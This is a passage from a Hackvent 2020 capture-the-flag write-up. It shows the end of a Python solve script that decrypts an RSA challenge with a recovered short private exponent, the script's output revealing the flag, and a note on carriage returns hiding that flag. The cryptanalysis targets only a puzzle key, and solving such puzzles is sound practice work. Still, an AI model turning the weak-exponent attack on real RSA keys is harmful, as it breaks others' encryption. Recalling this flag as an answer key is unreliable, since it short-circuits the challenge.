    msgi = int.from_bytes(msg, 'big')
    
    pti = pow(msgi, d, n)
    print(f'[+] Flag in bytes:\n{pti.to_bytes(256, "big")}')
    print(f'[-] Nice print fail: \n{pti.to_bytes(256, "big").decode()}')
    
    
    
    $ python3 -i solve.py 
    [+] Found d=6466004211023169931626852412529775638154232788523485346270752857587637907099874953950214032608531274791907536993470882928101441905551719029085370950197807
    [+] Found d=6466004211023169931626852412529775638154232788523485346270752857587637907099874953950214032608531274791907536993470882928101441905551719029085370950197807
    [+] Flag in bytes:
    b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\rYou made it! Here is your flag: HV20{5hor7_Priv3xp_a1n7_n0_5mar7}\r\rGood luck for Hackvent, merry X-mas and all the best for 2021, greetz SmartSmurf\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    [-] Nice print fail: 
    Good luck for Hackvent, merry X-mas and all the best for 2021, greetz SmartSmurf
    

**Flag:`HV20{5hor7_Priv3xp_a1n7_n0_5mar7}`**

### Trolley Carriage Returns

You may notice that my script prints the result both decoded into ASCII and as
bytes. In general, I like to include `decode()` to make the output look
prettier. However, the challenge author included just after the flag two (not
sure why two) carriage returns (`\r`). So when I print it as bytes, they just
show up as `\r`. But when I decode and print, the “Good luck for Hackvent”
message prints over the flag, so it isn’t visible on the screen.

[](/hackvent2020/medium)

